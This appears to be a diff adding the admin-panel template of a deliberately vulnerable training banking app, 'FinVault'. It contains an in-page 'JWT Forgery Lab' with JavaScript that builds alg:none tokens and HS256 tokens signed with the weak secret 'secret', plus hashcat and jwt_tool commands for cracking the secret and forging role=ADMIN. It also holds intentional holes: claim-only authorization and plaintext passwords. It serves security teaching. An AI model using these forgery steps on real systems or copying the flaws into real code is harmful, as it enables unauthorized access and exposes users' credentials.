@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en" xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FinVault — Admin Panel</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" rel="stylesheet">
+    <link href="/css/style.css" rel="stylesheet">
+</head>
+<body class="app-body">
+
+<nav th:replace="~{fragments/navbar :: navbar}"></nav>
+
+<div class="container-fluid py-4">
+
+    <div class="vuln-badge mb-4">
+        <i class="bi bi-bug-fill me-2"></i>
+        <strong>VULNERABILITY #7: JWT Misconfiguration</strong> —
+        Admin access is gated solely on the JWT <code>role</code> claim. Forge a token with
+        <code>"alg":"none"</code> (no signature needed) or crack the weak secret <code>"secret"</code>
+        with hashcat to set <code>"role":"ADMIN"</code>.
+    </div>
+
+    <!-- ACCESS DENIED (shown to non-admins) -->
+    <div th:unless="${isAdmin}">
+        <div class="row justify-content-center">
+            <div class="col-lg-8">
+                <div class="app-card border-danger mb-4">
+                    <div class="card-body text-center py-5">
+                        <i class="bi bi-shield-lock text-danger" style="font-size:4rem;"></i>
+                        <h3 class="text-danger mt-3">Access Denied</h3>
+                        <p class="text-muted">Your current JWT does not contain <code>role=ADMIN</code>.</p>
+                        <p class="text-muted" th:text="${error}"></p>
+                    </div>
+                </div>
+
+                <!-- JWT Forgery Lab -->
+                <div class="app-card mb-4">
+                    <div class="app-card-header">
+                        <h5 class="mb-0 text-gold"><i class="bi bi-key me-2"></i>JWT Forgery Lab</h5>
+                        <p class="text-muted small mb-0">Two methods to gain admin access</p>
+                    </div>
+                    <div class="card-body">
+
+                        <ul class="nav nav-tabs mb-3" id="jwtTabs">
+                            <li class="nav-item">
+                                <a class="nav-link active" data-bs-toggle="tab" href="#tab-algnone">Method 1: alg:none</a>
+                            </li>
+                            <li class="nav-item">
+                                <a class="nav-link" data-bs-toggle="tab" href="#tab-weaksecret">Method 2: Weak Secret</a>
+                            </li>
+                        </ul>
+
+                        <div class="tab-content">
+                            <!-- ALG:NONE -->
+                            <div class="tab-pane fade show active" id="tab-algnone">
+                                <p class="text-muted small mb-3">
+                                    The server accepts JWTs with <code>"alg":"none"</code> and skips signature verification.
+                                    Craft a token with any payload you want — no secret required.
+                                </p>
+
+                                <div class="mb-3">
+                                    <label class="form-label text-light">Header (Base64URL)</label>
+                                    <input class="form-control bg-dark text-light border-secondary font-monospace small"
+                                           id="algNoneHeader" readonly
+                                           value="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0">
+                                    <div class="form-text text-muted">Decodes to: <code>{"alg":"none","typ":"JWT"}</code></div>
+                                </div>
+
+                                <div class="mb-3">
+                                    <label class="form-label text-light">Payload — edit the role and userId</label>
+                                    <textarea class="form-control bg-dark text-light border-secondary font-monospace small"
+                                              id="algNonePayload" rows="4">{
+  "sub": "john",
+  "role": "ADMIN",
+  "userId": 1,
+  "iat": 1700000000,
+  "exp": 9999999999
+}</textarea>
+                                </div>
+
+                                <div class="mb-3">
+                                    <label class="form-label text-light">Generated Token (alg:none — no signature)</label>
+                                    <textarea class="form-control bg-dark text-warning border-secondary font-monospace small"
+                                              id="algNoneToken" rows="3" readonly placeholder="Click Generate..."></textarea>
+                                </div>
+
+                                <div class="d-flex gap-2">
+                                    <button class="btn btn-gold" onclick="generateAlgNoneToken()">
+                                        <i class="bi bi-gear me-2"></i>Generate Token
+                                    </button>
+                                    <button class="btn btn-danger" onclick="applyToken('algNoneToken')">
+                                        <i class="bi bi-key me-2"></i>Apply Token &amp; Reload
+                                    </button>
+                                </div>
+                            </div>
+
+                            <!-- WEAK SECRET -->
+                            <div class="tab-pane fade" id="tab-weaksecret">
+                                <p class="text-muted small mb-3">
+                                    The JWT is signed with the weak secret <code>"secret"</code>.
+                                    Use hashcat or jwt-tool to crack it, then forge a new token with <code>role=ADMIN</code>.
+                                </p>
+
+                                <div class="mb-3">
+                                    <label class="form-label text-light">Your current JWT (from cookie)</label>
+                                    <textarea class="form-control bg-dark text-warning border-secondary font-monospace small"
+                                              id="currentToken" rows="3" readonly></textarea>
+                                </div>
+
+                                <div class="mb-3 p-3 bg-dark border border-secondary rounded">
+                                    <p class="text-gold small fw-bold mb-2">Crack with hashcat:</p>
+                                    <pre class="text-warning small mb-0"><code># Save token to file
+echo -n "YOUR.JWT.TOKEN" > jwt.txt
+
+# Crack with hashcat (mode 16500 = JWT)
+hashcat -a 0 -m 16500 jwt.txt rockyou.txt
+
+# Result: secret "secret" found instantly</code></pre>
+                                </div>
+
+                                <div class="mb-3 p-3 bg-dark border border-secondary rounded">
+                                    <p class="text-gold small fw-bold mb-2">Forge with jwt-tool:</p>
+                                    <pre class="text-warning small mb-0"><code># Install jwt-tool
+pip install jwt_tool
+
+# Forge token with role=ADMIN
+python3 jwt_tool.py YOUR.JWT.TOKEN \
+  -T -p "secret" \
+  -I -pc role -pv ADMIN</code></pre>
+                                </div>
+
+                                <div class="mb-3">
+                                    <label class="form-label text-light">Or forge directly here (secret = "secret"):</label>
+                                    <textarea class="form-control bg-dark text-light border-secondary font-monospace small"
+                                              id="forgePayload" rows="3">{
+  "sub": "john", "role": "ADMIN", "userId": 1, "exp": 9999999999
+}</textarea>
+                                </div>
+
+                                <div class="mb-3">
+                                    <textarea class="form-control bg-dark text-warning border-secondary font-monospace small"
+                                              id="forgedToken" rows="2" readonly placeholder="Forged token appears here..."></textarea>
+                                </div>
+
+                                <div class="d-flex gap-2">
+                                    <button class="btn btn-gold" onclick="forgeWithSecret()">
+                                        <i class="bi bi-gear me-2"></i>Forge Token (secret="secret")
+                                    </button>
+                                    <button class="btn btn-danger" onclick="applyToken('forgedToken')">
+                                        <i class="bi bi-key me-2"></i>Apply Token &amp; Reload
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ADMIN PANEL (shown when role=ADMIN) -->
+    <div th:if="${isAdmin}">
+        <div class="alert alert-success d-flex align-items-center mb-4">
+            <i class="bi bi-shield-check-fill me-2 fs-4"></i>
+            <div>
+                <strong>Admin Access Granted</strong> — JWT role claim is <code>ADMIN</code>.
+                This access was granted based solely on the JWT payload — no database verification was performed.
+                If you forged this token, you now have full admin access.
+            </div>
+        </div>
+
+        <!-- Stats -->
+        <div class="row g-3 mb-4">
+            <div class="col-md-3">
+                <div class="stat-card">
+                    <div class="stat-icon"><i class="bi bi-people"></i></div>
+                    <div class="stat-body">
+                        <div class="stat-label">Total Users</div>
+                        <div class="stat-value" th:text="${users.size()}">0</div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="stat-card">
+                    <div class="stat-icon gold"><i class="bi bi-currency-dollar"></i></div>
+                    <div class="stat-body">
+                        <div class="stat-label">Total Deposits</div>
+                        <div class="stat-value">$1.05M</div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="stat-card">
+                    <div class="stat-icon blue"><i class="bi bi-activity"></i></div>
+                    <div class="stat-body">
+                        <div class="stat-label">Active Sessions</div>
+                        <div class="stat-value">4</div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="stat-card">
+                    <div class="stat-icon"><i class="bi bi-shield-exclamation"></i></div>
+                    <div class="stat-body">
+                        <div class="stat-label">Security Alerts</div>
+                        <div class="stat-value text-danger">8</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- All Users Table -->
+        <div class="app-card">
+            <div class="app-card-header">
+                <h5 class="mb-0"><i class="bi bi-people text-gold me-2"></i>All Users — Full Data</h5>
+                <p class="text-muted small mb-0">Passwords stored in plaintext. Visible to anyone who forges an admin JWT.</p>
+            </div>
+            <div class="card-body p-0">
+                <div class="table-responsive">
+                    <table class="table table-dark table-hover mb-0">
+                        <thead>
+                        <tr>
+                            <th class="ps-3">ID</th>
+                            <th>Username</th>
+                            <th>Password (plaintext!)</th>
+                            <th>Email</th>
+                            <th>Role</th>
+                            <th>Balance</th>
+                            <th>Account #</th>
+                            <th>Actions</th>
+                        </tr>
+                        </thead>
+                        <tbody>
+                        <tr th:each="u : ${users}">
+                            <td class="ps-3 text-muted" th:text="${u.id}"></td>
+                            <td class="fw-bold" th:text="${u.username}"></td>
+                            <td class="text-danger font-monospace" th:text="${u.password}"></td>
+                            <td class="text-muted small" th:text="${u.email}"></td>
+                            <td>
+                                <span class="badge"
+                                      th:classappend="${u.role == 'ADMIN'} ? 'bg-danger' : 'bg-primary'"
+                                      th:text="${u.role}"></span>
+                            </td>
+                            <td class="text-success fw-bold"
+                                th:text="'$' + ${#numbers.formatDecimal(u.balance, 1, 'COMMA', 2, 'POINT')}"></td>
+                            <td class="font-monospace small" th:text="${u.accountNumber}"></td>
+                            <td>
+                                <a th:href="@{/profile/{id}(id=${u.id})}" class="btn btn-sm btn-outline-gold">
+                                    <i class="bi bi-pencil"></i>
+                                </a>
+                            </td>
+                        </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+    // Display current JWT token
+    function getCookie(name) {
+        const v = document.cookie.match('(^|;) ?' + name + '=([^;]*)(;|$)');
+        return v ? v[2] : null;
+    }
+
+    const currentJwt = getCookie('jwt-token');
+    const currentTokenEl = document.getElementById('currentToken');
+    if (currentTokenEl && currentJwt) currentTokenEl.value = currentJwt;
+
+    // Generate alg:none token
+    function generateAlgNoneToken() {
+        try {
+            const payloadJson = document.getElementById('algNonePayload').value.trim();
+            const payload = JSON.parse(payloadJson);
+
+            const header  = btoa(JSON.stringify({alg:"none",typ:"JWT"}))
+                              .replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
+            const payloadB64 = btoa(JSON.stringify(payload))
+                              .replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
+
+            // alg:none — no signature, just trailing dot
+            const token = header + '.' + payloadB64 + '.';
+            document.getElementById('algNoneToken').value = token;
+        } catch(e) {
+            alert('Invalid JSON payload: ' + e.message);
+        }
+    }
+
+    // Forge with weak secret (pure JS HMAC-SHA256 using SubtleCrypto)
+    async function forgeWithSecret() {
+        try {
+            const payloadJson = document.getElementById('forgePayload').value.trim();
+            const payload = JSON.parse(payloadJson);
+
+            const header = {alg: "HS256", typ: "JWT"};
+            const headerB64  = btoa(JSON.stringify(header)).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
+            const payloadB64 = btoa(JSON.stringify(payload)).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
+            const sigInput = headerB64 + '.' + payloadB64;
+
+            const key = await crypto.subtle.importKey(
+                'raw', new TextEncoder().encode('secret'),
+                {name: 'HMAC', hash: 'SHA-256'}, false, ['sign']
+            );
+            const sig = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(sigInput));
+            const sigB64 = btoa(String.fromCharCode(...new Uint8Array(sig)))
+                              .replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
+
+            document.getElementById('forgedToken').value = sigInput + '.' + sigB64;
+        } catch(e) {
+            alert('Error: ' + e.message);
+        }
+    }
+
+    function applyToken(inputId) {
+        const token = document.getElementById(inputId).value.trim();
+        if (!token) { alert('Generate a token first'); return; }
+        document.cookie = 'jwt-token=' + token + '; path=/; max-age=86400';
+        window.location.reload();
+    }
+</script>
+</body>
+</html>
